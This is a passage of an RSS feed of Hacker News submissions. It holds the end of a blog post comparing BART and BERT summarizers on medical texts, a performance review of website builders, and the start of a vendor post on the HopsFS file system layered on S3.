<ul>
<li>Abstractive summaries are usually much more coherent and less informative than extractive ones.</li>
<li>Many abstractive summarization models use attention mechanisms, making them unsuitable for long texts. (original <a href="https://arxiv.org/abs/1706.03762">paper</a>).</li>
<li>Extractive summary algorithms are much easier to create. Sometimes even no specific datasets are necessary. In contrast, abstractive ones need a lot of specially marked-up texts.</li>
</ul>
<h2><strong>Models</strong></h2>
<p>Today, there are many different models for summarizing a text in English (you can find more information <a href="https://github.com/sebastianruder/NLP-progress/blob/master/english/summarization.md">here</a>). There is no specific theory to figure out which model works fine for a particular kind of text. It needs experimenting.</p>
<p>We compared abstractive and extractive summarization models when used in scientific medicine texts. The main feature of such texts is that they contain plenty of numbers, graphic objects which provide readers with little information by themselves. Thus, models should “understand” it and exclude such parts of the text from the final summary.</p>
<p>We considered two models: BART_Summarizer (abstractive summarizer) and BERT_Summarizer (extractive summarizer).</p>
<h2><strong><em>BART_Summarizer</em></strong></h2>
<p><a href="https://arxiv.org/abs/1910.13461">BART</a> is a model that generalizes the approaches of the <a href="https://arxiv.org/abs/1810.04805">BERT</a> and <a href="https://d4mucfpksywv.cloudfront.net/better-language-models/language-models.pdf">GPT-2</a> models. It uses a bidirectional encoder and an autoregressive decoder. This language model can be applied to a wide range of text generation tasks, including automatic text summarization. The model builds an abstract summary and works efficiently with not very long texts. Currently shows one of the best ROUGE scores on the news dataset «CNN/DailyMail.»</p>
<p>Since this model text length limit, the text can be divided into several parts, summarized independently. Moreover, short sentences (less than 20 symbols) hurt both abstractive and extractive models' performance quality. That’s why during the text preprocessing, parts of these sentences get removed.</p>
<h2><strong><em>BERT_Summarizer</em></strong></h2>
<p><a href="https://arxiv.org/abs/1810.04805">BERT</a> is a language model developed by Google which can extract semantic features from a text. All these features can be transformed into vectors of words, sentences, and whole text. BERT_Summarizer uses BERT for building vectors of sentences and then clustering algorithm K-Means to allocate all sentences into groups with similar semantics. The final summary gets formulated from sentences that are the most closed to cluster centroids. Such an approach enables the selection of representative sentences of most semantic parts from a text.</p>
<p>The idea of clustering is illustrated below.</p>
<p><img alt="Sentence Clusters" src="https://broutonlab.com/static/img/blog/summarization-of-medical-texts-machine-learning/sentence-clusters.jpg"></p>
<p><em>Figure 3. Sentence clusters</em></p>
<h2><strong><em>Results</em></strong></h2>
<p>We gathered 20 articles from a<a href="http://www.medicinescience.org/"> medical journal</a> and evaluated the models under the supervision of <a href="https://en.wikipedia.org/wiki/ROUGE_(metric)">ROUGE-metrics</a> and manually. The results showed that both models could be applied to summarize medicine texts. Yet, extractive summarizer works with a bit better quality. It turned out that an abstractive summarizer uses the generating approach. It sometimes makes factual mistakes because medical texts have a complicated structure. Additionally, the model has to work with several parts of the original text independently. Also, abstractive summarization takes much more time on long texts and uses a lot of RAM resources. That’s why extractive summarization for long medical texts is more preferred.</p>
<p>You can try to use the models yourself. Follow the instructions described in the <a href="https://colab.research.google.com/drive/1WZhF3uwTtoAgy3JtTtrAfu-4CrRJXB2e?usp=sharing">demo</a>, explore, and have fun with it. The example of texts that models worked with is provided there as well.</p>
<h2><strong><em>Examples</em></strong></h2>
<h3>1) Original text:</h3>
<p>American researchers have found out that testing blood can reveal the risk of Alzheimer's disease in later years. If the results are confirmed, it would be real progress towards helping patients suffering from these diseases. In most cases, Alzheimer's disease hits the brain slowly. Patients may go on for several years without knowing it. According to doctors, most drugs do not help because they are given too late.</p>
<p>Today doctors use computer scans to determine if there is damage to the brain. An examination based on blood would be an easy and cheap way to test patients. Although researchers are excited about the new blood-based tests, they say that it will not be available for widespread use within the next five to ten years.</p>
<h3><em>Generated summary:</em></h3>
<p><em>American researchers have found out that testing blood can reveal the risk of Alzheimer's disease in later years. If the results are confirmed, it would be real progress towards helping patients suffering from these diseases. Although researchers are excited about the new blood-based tests, they say that it will not be available for widespread use within the next five to ten years.</em></p>
<h3>2) Original text:</h3>
<p>The WHO reports that Japanese residents who lived near the Fukushima nuclear reactor are at a higher risk of getting cancer. They say that it is unclear how many people got exposed to high radiation levels, but those living in the area had a higher risk of developing cancer in their lifetime. Small children may develop thyroid cancer.</p>
<p>The organization also reports that leukemia, breast cancer may as well go up. The report suggests that females are more likely to develop cancer than males. Besides, about a third of the emergency workers got exposed to radiation after the accident. The World Health Organization emphasizes that there is no health risk to the rest of the Japanese population. However, people living in the Fukushima area should be observed over a longer period.</p>
<h3><em>Generated summary:</em></h3>
<div><p><em>The WHO says it is unclear how many people got exposed to high radiation levels, but those living in the area had a higher risk of developing cancer in their lifetime. The organization also reports that leukemia, breast cancer may also go up. They emphasize that there is no health risk to the rest of the Japanese population.</em></p></div>

			</div></div>]]>
            </description>
            <link>https://broutonlab.com/blog/summarization-of-medical-texts-machine-learning</link>
            <guid isPermaLink="false">hacker-news-small-sites-25149236</guid>
            <pubDate>Thu, 19 Nov 2020 13:30:45 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Website Builder Performance Review]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25149211">thread link</a>) | @mostlystatic
<br/>
November 19, 2020 | https://www.debugbear.com/blog/website-builder-performance-review | <a href="https://web.archive.org/web/*/https://www.debugbear.com/blog/website-builder-performance-review">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
  
  <div>
    <div>
    
      
      

      

      <div>
        
        

        <p>Site builders let you create your own website without writing any code, but the websites they generate aren't always fast. Slow page load times not only affect the experience of your visitors, but <a href="https://www.debugbear.com/docs/metrics/core-web-vitals">can also hurt SEO</a>.</p>
<p>I tested the performance of a similar site built using 14 different website builder tools. This post first presents the overall results and then looks at each website builder in detail.</p>
<ol>
<li><a href="#site-builder-performance-results">Site builder performance results</a></li>
<li><a href="#rendering-performance">Rendering performance</a></li>
<li><a href="#a-look-at-the-performance-of-each-site-builder">A look at the performance of each site builder</a></li>
<li><a href="#takeaways-for-site-builder-developers">Takeaways for site builder developers</a></li>
<li><a href="#more-metrics">More metrics</a></li>
</ol>
<h2 id="site-builder-performance-results">Site builder performance results</h2>
<p>The table below shows the test results for each website builder. It's sorted by the site's Lighthouse score, which gives an overall assessment of the performance of a web page. (This is also the score you would get from PageSpeed Insights.)</p>
<p>The Performance score isn't always the best metric to evaluate website performance. You can click on the column headings in the table to sort the different site builders by a different metric.</p>
<p>While Versoly has the highest Lighthouse score on mobile, Wix has the highest score on a desktop device. Strikingly renders initial content the fastest, but it takes a long time for the page to become interactive.</p>
<div id="WebsiteBuilderReview2020Table" data-reactroot=""><table><thead><tr><th>Site Builder</th><th><span>▾</span> <!-- -->Score</th><th><span>▾</span> <!-- -->FCP</th><th><span>▾</span> <!-- -->SI</th><th><span>▾</span> <!-- -->LCP</th><th><span>▾</span> <!-- -->TTI</th><th><span>▾</span> <!-- -->CPU</th><th><span>▾</span> <!-- -->Size</th></tr></thead><tbody><tr><td>Versoly</td><td>80</td><td>2.11 s</td><td>3.43 s</td><td>4.37 s</td><td>4.38 s</td><td>672 ms</td><td>453 KB</td></tr><tr><td>Webflow</td><td>77</td><td>1.74 s</td><td>3.13 s</td><td>4.95 s</td><td>4.96 s</td><td>1.35 s</td><td>671 KB</td></tr><tr><td>Wix</td><td>72</td><td>1.67 s</td><td>2.67 s</td><td>5.24 s</td><td>6.69 s</td><td>3.26 s</td><td>759 KB</td></tr><tr><td>Site123</td><td>67</td><td>2.61 s</td><td>3.21 s</td><td>3.40 s</td><td>5.57 s</td><td>2.30 s</td><td>558 KB</td></tr><tr><td>GoDaddy</td><td>63</td><td>2.30 s</td><td>3.02 s</td><td>3.93 s</td><td>7.02 s</td><td>3.77 s</td><td>783 KB</td></tr><tr><td>Jimdo</td><td>58</td><td>3.62 s</td><td>5.54 s</td><td>5.70 s</td><td>4.34 s</td><td>1.35 s</td><td>517 KB</td></tr><tr><td>Yola</td><td>54</td><td>2.08 s</td><td>4.60 s</td><td>4.62 s</td><td>3.65 s</td><td>3.22 s</td><td>615 KB</td></tr><tr><td>Webnode</td><td>48</td><td>3.75 s</td><td>4.92 s</td><td>9.05 s</td><td>6.26 s</td><td>2.21 s</td><td>855 KB</td></tr><tr><td>Weebly</td><td>39</td><td>3.40 s</td><td>6.74 s</td><td>7.33 s</td><td>7.40 s</td><td>3.74 s</td><td>996 KB</td></tr><tr><td>Wordpress.com</td><td>34</td><td>2.65 s</td><td>4.88 s</td><td>5.54 s</td><td>15.9 s</td><td>9.46 s</td><td>878 KB</td></tr><tr><td>Strikingly</td><td>32</td><td>1.12 s</td><td>4.01 s</td><td>22.5 s</td><td>28.7 s</td><td>10.6 s</td><td>2.32 MB</td></tr><tr><td>SquareSpace</td><td>31</td><td>2.09 s</td><td>8.29 s</td><td>8.79 s</td><td>6.97 s</td><td>3.56 s</td><td>994 KB</td></tr><tr><td>Weblium</td><td>23</td><td>3.68 s</td><td>6.44 s</td><td>6.93 s</td><td>19.0 s</td><td>3.67 s</td><td>1.14 MB</td></tr><tr><td>UCraft</td><td>18</td><td>2.67 s</td><td>10.6 s</td><td>15.6 s</td><td>22.7 s</td><td>10.4 s</td><td>3.29 MB</td></tr></tbody></table></div>
<h3 id="performance-metrics">Performance metrics</h3>
<h4 id="lighthouse-performance-score">Lighthouse Performance Score</h4>
<p>This is an overall assessment of the website's performance, combining 6 different metrics into a score ranging from 0 to 100.</p>
<h4 id="first-contentful-paint-speed-index-si-and-largest-contentful-paint-lcp">First Contentful Paint, Speed Index (SI), and Largest Contentful Paint (LCP)</h4>
<p>The <a href="https://www.debugbear.com/docs/metrics/first-contentful-paint">First Contentful Paint</a> measures when the user first starts seeing page content, such as text or an image.</p>
<p>Speed Index visually measures how quickly the page content reaches its final state.</p>
<p>The <a href="https://www.debugbear.com/docs/metrics/largest-contentful-paint">Largest Contentful Paint</a> measures when the largest element on the page was rendered. Unlike Speed Index, the LCP will increase even if the newly painted element is similar to the previous element content.</p>
<h4 id="tti-time-to-interactive">TTI (Time to Interactive)</h4>
<p>Time to Interactive measures how quickly the page becomes idle, meaning there isn't much ongoing network or CPU activity. This usually means that any interactive elements on the page are ready to be used by the visitor.</p>
<h4 id="cpu-processing-time">CPU Processing Time</h4>
<p>This measures how much time the browser spends on things like running JavaScript code or rendering page content.</p>
<h4 id="page-size">Page Size</h4>
<p>This measures the overall (compressed) download weight of the page.</p>
<h2 id="rendering-performance">Rendering performance</h2>
<p>Minimizing the time it takes for page content to appear after navigating to a page is one of the most important aspects of site performance.</p>
<p>The image shows a side by side view of the rendering timelines of all tested website builders.</p>
<p><img src="https://www.debugbear.com/public/blog/website-builder-performance/timelines.png" alt="Filmstrips for all tested website builders"></p>
<p>(I added Webflow later, so it's not included in this image.)</p>
<h2 id="a-look-at-the-performance-of-each-site-builder">A look at the performance of each site builder</h2>
<h3 id="versoly">Versoly</h3>
<p>Versoly takes a while to render the image, but doesn't run any additional JavaScript processing once the page has loaded.</p>
<p>A different default background color for the image would make it easier to read the text early on.</p>
<p><img src="https://www.debugbear.com/public/blog/website-builder-performance/versoly.png" alt=""></p>
<p>There are two render-blocking CSS files, both on different domains. That means the existing server connection can't be re-used. The background image does not start loading until the render-blocking CSS has been finished loading.</p>
<p><img src="https://www.debugbear.com/public/blog/website-builder-performance/versoly-requests.png" alt=""></p>
<p>Versoly only makes 10 requests overall, which is the lowest request count among all tested site builders.</p>
<h3 id="webflow">Webflow</h3>
<p>Webflow also starts to render quite quickly, but then takes a while to start downloading the image.</p>
<p><img src="https://www.debugbear.com/public/blog/website-builder-performance/webflow.png" alt=""></p>
<p>With a size of just 2KB, the initial page HTML loads very quickly. However, there are two render-blocking CSS and JavaScript requests, both on different domains that require a new server connection.</p>
<p>The hero background image is defined in the render-blocking CSS file, and therefore doesn't start to load until after the CSS file.</p>
<p>At 355KB the background image is also fairly large and takes a while to download. It could be worth first serving a low-resolution version of the image before starting the full download.</p>
<p><img src="https://www.debugbear.com/public/blog/website-builder-performance/webflow-requests.png" alt=""></p>
<h3 id="wix">Wix</h3>
<p>Wix quickly renders the general page layout and then loads the image. It looks like the text doesn't show up until a web font is loaded, however this doesn't seem to be the case when testing with a newer version of Chrome.</p>
<p><img src="https://www.debugbear.com/public/blog/website-builder-performance/wix.png" alt=""></p>
<p>Compared to Versoly, the Wix site is a lot chunkier with 66 network requests and 2s of JavaScript execution time.</p>
<p>Wix does not have any render-blocking resources apart from the root document, but downloading the 102KB HTML document can take half a second on a slow connection.</p>
<p><img src="https://www.debugbear.com/public/blog/website-builder-performance/wix-requests.png" alt=""></p>
<h3 id="site-123">Site123</h3>
<p>The Site123 page loads fairly quickly, loading two render-blocking CSS files in addition to the document. Once the site has rendered there's isn't much additional work that's done by the CPU.</p>
<p><img src="https://www.debugbear.com/public/blog/website-builder-performance/site123.png" alt=""></p>
<p>The background image starts loading immediately after the HTML response has arrived, thanks to a <a href="https://www.debugbear.com/blog/resource-hints-rel-preload-prefetch-preconnect"><code>rel="preload"</code></a> tag.</p>
<p><img src="https://www.debugbear.com/public/blog/website-builder-performance/site123-requests.png" alt=""></p>
<h3 id="go-daddy">GoDaddy</h3>
<p>The GoDaddy site contains several render-blocking scripts and stylesheets. The background image loads quickly, as GoDaddy first serves a 1.3KB low-resolution image before serving the higher-resolution version.</p>
<p><img src="https://www.debugbear.com/public/blog/website-builder-performance/godaddy.png" alt=""></p>
<p>In total, GoDaddy makes 148 network requests when loading the page. Part of this consists of initializing a service worker, so that the site is available offline after the initial load.</p>
<p><img src="https://www.debugbear.com/public/blog/website-builder-performance/godaddy-requests.png" alt=""></p>
<h3 id="jimdo">Jimdo</h3>
<p>The initial render for the Jimdo site is quite slow, and it takes over 6s for the image to show up.</p>
<p><img src="https://www.debugbear.com/public/blog/website-builder-performance/jimdo.png" alt=""></p>
<p>The cause of this is a chain of render-blocking CSS requests. First, Jimdo loads <code>layout.css</code>, which in turn contains an <code>@import</code> statement fetching a font definition.</p>
<p><img src="https://www.debugbear.com/public/blog/website-builder-performance/jimdo-requests.png" alt=""></p>
<h3 id="yola">Yola</h3>
<p>The Yola site only has partial server-side rendering, most of the work is done by client-side JavaScript. As a result, the page spends 1s running JavaScript before starting to load the background image.</p>
<p><img src="https://www.debugbear.com/public/blog/website-builder-performance/yola.png" alt=""></p>
<p>The JavaScript application code, as well as multiple CSS files, also block the initial render for a while.</p>
<p><img src="https://www.debugbear.com/public/blog/website-builder-performance/yola-requests.png" alt=""></p>
<h3 id="webnode">Webnode</h3>
<p>On the Webnode site, no content is rendered for the first 4s.</p>
<p><img src="https://www.debugbear.com/public/blog/website-builder-performance/webnode.png" alt=""></p>
<p>Again we can see a chain of render-blocking CSS requests. The first Typekit CSS file uses <code>@import</code> to load another CSS file.</p>
<p>Importantly, this CSS file is on a different domain, meaning a new server connection has to be set up. This could be sped up by preconnecting to the <code>p.typekit.net</code> domain.</p>
<p><img src="https://www.debugbear.com/public/blog/website-builder-performance/webnode-requests.png" alt=""></p>
<h3 id="weebly">Weebly</h3>
<p>Weebly starts rendering after 4s, but text doesn't appear until 5 seconds after opening the page.</p>
<p><img src="https://www.debugbear.com/public/blog/website-builder-performance/weebly.png" alt=""></p>
<p>This is because the page is waiting to load the web fonts before rendering the text. This delay could be avoided by using the CSS <code>font-display: swap</code> option, which would use a default font until the desired font is available.</p>
<p><img src="https://www.debugbear.com/public/blog/website-builder-performance/weebly-requests.png" alt=""></p>
<h3 id="wordpress-com">Wordpress.com</h3>
<p>The Wordpress.com site starts to render after about 4s and the image loads after 6s.</p>
<p><img src="https://www.debugbear.com/public/blog/website-builder-performance/wordpress.png" alt=""></p>
<p>After the initial load it takes a while for the page to become idle. It makes a total of 355 requests, mostly contacting various advertising domains.</p>
<p><img src="https://www.debugbear.com/public/blog/website-builder-performance/wordpress-requests.png" alt=""></p>
<h3 id="strikingly">Strikingly</h3>
<p>Strikingly inlines all necessary CSS into the initial document request. As a result, there are no render-blocking scripts or stylesheets, and Strikingly has the fastest First Contentful Paint with a value of just 1.1s.</p>
<p><img src="https://www.debugbear.com/public/blog/website-builder-performance/strikingly.png" alt=""></p>
<p>However, the site then continues to download 1.8MB of JavaScript code. All of this needs to load and execute before the page becomes interactive, for example so that visitors can click on the menu icon.</p>
<p>To speed up that process, the bundle size could be reduced and the two scripts could be loaded in parallel.</p>
<p><img src="https://www.debugbear.com/public/blog/website-builder-performance/strikingly-requests.png" alt=""></p>
<p>When testing the site with PageSpeed Insights, Lighthouse actually prematurely ends the test before the page finishes loading and becomes interactive. As a result, it reports a Time to Interactive of just 4.5s, and an overall Performance score of 72.</p>
<p><img src="https://www.debugbear.com/public/blog/website-builder-performance/strikingly-psi.png" alt=""></p>
<h3 id="square-space">SquareSpace</h3>
<p>SquareSpace starts loading reasonably quickly, but it then takes a long time before the background image shows up.</p>
<p><img src="https://www.debugbear.com/public/blog/website-builder-performance/squarespace.png" alt=""></p>
<p>This is because the image is not included in HTML that was rendered on the server, and as a result the browser first needs to download and run 609KB of JavaScript code before starting to load the image.</p>
<p><img src="https://www.debugbear.com/public/blog/website-builder-performance/squarespace-requests.png" alt=""></p>
<h3 id="weblium">Weblium</h3>
<p>Rendering of the Weblium site is blocked for a while due to various CSS files, including a 172 KB stylesheet with embedded web fonts.</p>
<p><img src="https://www.debugbear.com/public/blog/website-builder-performance/weblium.png" alt=""></p>
<p>After the initial render, Weblium launches a React app and starts downloading the background image. Later on in the process a 475 KB JavaScript file called <code>legacy.js</code> is loaded and run.</p>
<p><img src="https://www.debugbear.com/public/blog/website-builder-performance/weblium-requests.png" alt=""></p>
<h3 id="u-craft">UCraft</h3>
<p>The UCraft site starts rendering fairly quickly, but the background image is lazy loaded and depends on JavaScript code to run and trigger the image download.</p>
<p><img src="https://www.debugbear.com/public/blog/website-builder-performance/ucraft.png" alt=""></p>
<p>Once that JavaScript code has run, the page not only downloads the background image but also another 1.16MB that isn't used on the site but appears to be part of the template I used.</p>
<p><img src="https://www.debugbear.com/public/blog/website-builder-performance/ucraft-requests.png" alt=""></p>
<h3 id="mozello">Mozello</h3>
<p>I tested Mozello as well, but didn't include it in the results because the free plan doesn't support HTTPS. HTTPS is good for security but slightly slows websites down, so it didn't feel like an apples to apples comparison.</p>
<p>Having said that, Mozello's mobile Lighthouse score of 83 was actually the highest overall score. I would expect Mozello sites to be fast even with HTTPS enabled.</p>
<p>With a page weight of 258 KB, Mozello also had the lowest download size. After the initial render there's no further network or CPU activity.</p>
<p><img src="https://www.debugbear.com/public/blog/website-builder-performance/mozello.png" alt=""></p>
<h2 id="methodology">Methodology</h2>
<p>In each website builder, I created a simple site with two components: a heading section with a background image, and a three column text section. I …</p></div></div></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.debugbear.com/blog/website-builder-performance-review">https://www.debugbear.com/blog/website-builder-performance-review</a></em></p>]]>
            </description>
            <link>https://www.debugbear.com/blog/website-builder-performance-review</link>
            <guid isPermaLink="false">hacker-news-small-sites-25149211</guid>
            <pubDate>Thu, 19 Nov 2020 13:26:14 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[HopsFS: 100x Times Faster Than AWS S3]]>
            </title>
            <description>
<![CDATA[
Score 17 | Comments 3 (<a href="https://news.ycombinator.com/item?id=25149154">thread link</a>) | @nathaliaariza
<br/>
November 19, 2020 | https://www.logicalclocks.com/blog/hopsfs-100x-times-faster-than-aws-s3 | <a href="https://web.archive.org/web/*/https://www.logicalclocks.com/blog/hopsfs-100x-times-faster-than-aws-s3">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><div><div><div><div><p>TLDR; Many developers believe S3 is the "end of file system history". It is impossible to build a file/object storage system on AWS that can compete with S3 on cost. But what if you could build on top of S3 a distributed file system with a HDFS API that gives you POSIX goodness and improved performance? That’s what we have done with a cloud-native release of HopsFS that is highly available across availability zones, has the same cost as S3, but has 100X the performance of S3 for file move/rename operations, and 3.4X the read throughput of S3 (EMRFS) for the DFSIO Benchmark (peer reviewed at ACM Middleware 2020).</p></div><figure id="w-node-31b3b43a5a37-b88dcb71"><p><img src="https://uploads-ssl.webflow.com/5e6f7cd3ee7f51ec3ea4da0f/5fb65d314c5b6d0d5e4ae699_p4lO2294TIlBpyTyn36TMK3IC2UgJYIsOShNfA_v4ubinKblLQKOXG8rKcWnKuxoNJVGfRHWH69bEpG-twMaswNrBnv22mhMlGDVnW2SU3s1mRtQ-7BWL9kii4GleyV774hoZCE4.png" alt=""></p><figcaption><strong>HopsFS has lower latency and higher throughput than EMRFS (S3) for metadata operations (</strong><a href="https://www.logicalclocks.com/research/hopsfs-s3-extending-object-stores-with-posix-like-semantics-and-more-industry-track"><strong>Middleware ‘20</strong></a><strong>).<br></strong></figcaption></figure><h2>The Dumb Bucket</h2><p>S3 has become the de-facto platform for storage in AWS due to its scalability, high availability, and low cost. However, S3 provides weaker guarantees and lower performance compared to distributed hierarchical file systems. Despite this, many developers erroneously believe that S3 is the end of file system history - there is no alternative to S3, so just re-write your applications to account for its limitations (such as slow and inconsistent file listings, non atomic file/dir rename, closed metadata, and limited change data capture (CDC) support). Azure has built an improved file system, <a href="https://docs.microsoft.com/en-us/azure/storage/blobs/data-lake-storage-introduction">Azure Data Lake Storage</a> (ADLS) V2, on top of Azure Blob Storage (ABS) service. ADLS provides a HDFS API to access data stored in a ABS container, giving improved performance and POSIX-like goodness. But, until today, there has been no equivalent to ADLS for S3. Today, we are launching HopsFS as part of <a href="https://www.hopsworks.ai/">Hopsworks</a>.</p><h2>Hierarchical File Systems strike back in the Cloud</h2><p>Hierarchical distributed file systems (like HDFS, CephFS, GlusterFS) were not scalable enough or highly available across availability zones in the cloud, motivating the move to S3 as the scalable storage service of choice. In addition to the technical challenges, AWS have priced virtual machine storage and inter-availability zone network traffic so high that no third party vendor could build a storage system that offers a per-byte storage cost close in price to S3.&nbsp;</p><p>However, the move to S3 has not been without costs. Many applications need to be rewritten as the stronger POSIX-like behaviour of hierarchical file systems (atomic move/rename, consistent file listings, consistent read-after-writes) has been replaced by weakened guarantees in S3. Even simple tasks, such as finding out what files you have, cannot be easily done on S3 when you have enough files, so a <a href="https://docs.aws.amazon.com/AmazonS3/latest/dev/storage-inventory.html">new service was introduced</a> to enable you to pay extra to get a stale listing of your files. Most analytical applications (e.g., on EMR) use <a href="https://docs.aws.amazon.com/emr/latest/ManagementGuide/emr-fs.html">EMRFS</a>, instead of S3, which is a new metadata layer for S3 that provides slightly stronger guarantees than S3 - such as consistent file listings.</p><h2>File systems are making the same Journey as Databases</h2><p>The journey from a stronger POSIX-like file system to a weaker object storage paradigm and back again has parallels in the journey that databases have made in recent years. Databases made the transition from strongly consistent single-host systems (relational databases) to highly available (HA), eventually consistent distributed systems (NoSQL systems) to handle the massive increases in data managed by databases. However, <a href="https://www.singlestore.com/blog/why-nosql-databases-wrong-tool-for-modern-application/">NoSQL is just too hard for developers</a>, and databases are returning to strongly consistent (but now scalable) NewSQL systems, with databases such as Spanner, CockroachDB, SingleSQL, and MySQL Cluster.&nbsp;</p><p>In this blog, we show that distributed hierarchical file systems are completing a similar journey, going from strongly consistent POSIX-compliant file systems to object stores (with their weaker consistency models, but high availability across data centers), and back to distributed hierarchical file systems that are HA across data centers, without any loss in performance and, crucially, without any increase in cost, as we will use S3 as block storage for our file system.</p><h2>HopsFS</h2><p>HopsFS is a distributed hierarchical file system that provides a HDFS API (POSIX-like API), but stores its data in a bucket in S3. We redesigned HopsFS to (1) be <a href="https://www.logicalclocks.com/research/distributed-hierarchical-file-systems-strike-back-in-the-cloud">highly available across availability zones in the cloud</a> and (2) to <a href="https://www.logicalclocks.com/research/hopsfs-s3-extending-object-stores-with-posix-like-semantics-and-more-industry-track">transparently use S3 to store the file’s blocks without sacrificing the file system’s semantics</a>. The original data nodes in HopsFS have now become stateless workers (part of a standard Hopsworks cluster) that include a new block caching service to leverage faster local VM storage for hot blocks. It is important to note that the cache is a global cache - not a local worker cache found in other vendor’s Spark workers - that includes secure access control to the cache. In our experiments, we show that HopsFS outperforms <a href="https://docs.aws.amazon.com/emr/latest/ManagementGuide/emr-fs.html">EMRFS</a> (S3 with metadata in DynamoDB for improved performance) for IO-bound workloads, with up to 20% higher performance and delivers up to 3.4X the aggregated read throughput of EMRFS. Moreover, we demonstrate that metadata operations on HopsFS (such as directory rename or file move) are up to two orders of magnitude faster than EMRFS. Finally, HopsFS opens up the currently closed metadata in S3, enabling correctly-ordered change notifications with HopsFS’ change data capture (CDC) API and customized extensions to metadata.&nbsp;</p><p>At Logical Clocks, we have leveraged HopsFS’ capabilities to build the industry’s first feature store for machine learning (<a href="https://docs.hopsworks.ai/">Hopsworks Feature Store</a>). The Hopsworks Feature Store is built on <a href="https://github.com/logicalclocks/hive">Hops Hive</a> and customized metadata extensions to HopsFS, ensuring strong consistency between the offline Feature Store, the online Feature Store (<a href="http://mikaelronstrom.blogspot.com/">NDB Cluster</a>), and data files in HopsFS.</p><figure id="w-node-f9d069e8e82e-b88dcb71"><p><img src="https://uploads-ssl.webflow.com/5e6f7cd3ee7f51ec3ea4da0f/5fb65dda6508bd64742b2b40_Screenshot%202020-11-19%20at%2012.58.07.png" loading="lazy" alt=""></p></figure><h3>Some of the key advantages of HopsFS/S3 are:</h3><h4><strong>POSIX-Like Semantics with a HDFS API</strong></h4><ul role="list"><li>Consistent file listings, consistent read-after-write, atomic rename (files/directories).</li></ul><h4><strong>Open, Extensible Metadata</strong></h4><ul role="list"><li><a href="https://hopsworks.readthedocs.io/en/stable/user_guide/hopsfs/xattrs.html">XAttr API</a> to attach arbitrary metadata to files/directories.</li></ul><h4><strong>Change Data Capture API</strong></h4><ul role="list"><li>Correctly ordered stream of file system mutation events delivered with low latency to downstream clients by <a href="https://ieeexplore.ieee.org/document/8752956">ePipe</a>.</li></ul><h4><strong>Free-Text search API for File System Namespace</strong></h4><ul role="list"><li>File system namespace metadata changes can be transparently replicated to Elasticsearch for low-latency free-text search of the namespace and its extended metadata. This service is provided by Hopsworks.</li></ul><h4><strong>X.509 Certificates for Authentication, TLS for Encryption-in-Transit</strong></h4><ul role="list"><li>HopsFS uses X.509 Certificates to identify and authenticate clients, with TLS providing end-to-end encryption-in-transit.&nbsp;</li></ul><h4><strong>Faster Metadata Operations</strong></h4><ul role="list"><li>File/directory rename/move, file listings - no limit on retrieving 1000 files-at-a-time (as in S3).&nbsp;</li></ul><h4><strong>Faster Read Operations</strong></h4><ul role="list"><li>Workers in HopsFS securely cache file blocks on behalf of clients using local VM storage. NameNodes are cache-aware and redirect clients to securely read the cached block from the correct worker.</li></ul><h4><strong>Highly Available across Availability Zones (AZs)</strong></h4><ul role="list"><li>Support for high availability (HA) across AZs through AZ-aware replication protocols.<br></li></ul><h2>HopsFS/S3 Performance</h2><p>We compared the performance of EMRFS instead of S3 with HopsFS, as EMRFS provides stronger guarantees than S3 for consisting listing of files and <a href="https://www.hatch.team/blog/post/achieving-s3-read-after-update-consistency">consistent read-after-updates</a> for objects. EMRFS uses DynamoDB to store a partial replica of S3’s metadata (such as what files/directories are found in a given directory), enabling faster listing of files/dirs compared to S3 and <a href="https://docs.aws.amazon.com/emr/latest/ManagementGuide/emr-plan-consistent-view.html">stronger consistency</a> (consistent file listings and consistent read-after-update, although no atomic rename) .</p><p>Here are some selected results from our peer-reviewed research paper accepted for publication at ACM/IFIP Middleware 2020. The paper includes more results than shown below, and for writes, HopsFS is on-average about 90% of the performance of EMRFS - as HopsFS has the overhead of first writing to workers who then write to S3.&nbsp; HopsFS has a global worker cache (if the block is cached at any worker, clients will retrieve the data directly from the worker)&nbsp; for faster reads and the HopsFS’ metadata layer is built on NDB cluster for faster metadata operations.</p><figure id="w-node-b5601ef697cf-b88dcb71"><p><img src="https://uploads-ssl.webflow.com/5e6f7cd3ee7f51ec3ea4da0f/5fb65eaca9a96e19315a05e8_Screenshot%202020-11-19%20at%2013.01.36.png" loading="lazy" alt=""></p></figure><p>*Enhanced DFSIO Benchmark Results with 16 concurrent tasks reading 1GB files. For higher concurrency levels (64 tasks), the performance improvement drops from 3.4X to 1.7X.</p><p>**<a href="https://aws.amazon.com/about-aws/whats-new/2018/07/amazon-s3-announces-increased-request-rate-performance/#:~:text=Amazon%20S3%20now%20provides%20increased,time%20for%20no%20additional%20charge.">As of November 2020</a>, 3500 ops/sec is the maximum number of PUT/COPY/POST/DELETE per second per S3 prefix, while the maximum number of GET/HEAD requests per prefix is 5500 reads/sec. You can increase throughput in S3 by reading/writing in parallel to different prefixes, but this will probably require rewriting your application code and increasing the risk of bugs. For HopsFS (without S3), <a href="https://www.logicalclocks.com/research/distributed-hierarchical-file-systems-strike-back-in-the-cloud">we showed</a> that it can reach 1.6m metadata ops/sec across 3 availability zones.&nbsp;</p><p>In our <a href="https://www.logicalclocks.com/research/distributed-hierarchical-file-systems-strike-back-in-the-cloud">paper published at ICDCS</a>, we measured the throughput of HopsFS when deployed in HA mode over 3 availability zones. Using a workload from Spotify, we compared the performance with CephFS. HopsFS (1.6M ops/sec) reaches 2X the throughput of CephFS (800K ops/sec) when both are deployed in full HA mode. CephFS, however, does not currently support storing its data in S3 buckets.<br></p><h2>How do I get started with HopsFS?</h2><p>HopsFS is available as <a href="https://github.com/hopshadoop/hops">open-source</a> (Apache V2). However, cloud-native HopsFS is currently only available as part of the <a href="https://www.hopsworks.ai/">hopsworks.ai</a> platform. Hopsworks.ai is a platform for the design and operation of AI applications at scale with support for scalable compute in the form of Spark, Flink, TensorFlow, etc (comparable to Databricks or AWS EMR). You can also connect Hopsworks.ai to a Kubernetes cluster and launch jobs on Kubernetes that can read/write from HopsFS. You connect your cluster to a S3 bucket in your AWS account or on Azure to a Azure Blob Storage bucket. You can dynamically add/remove workers to/from your cluster, and the workers act as part of the HopsFS cluster - using minimal resources, but 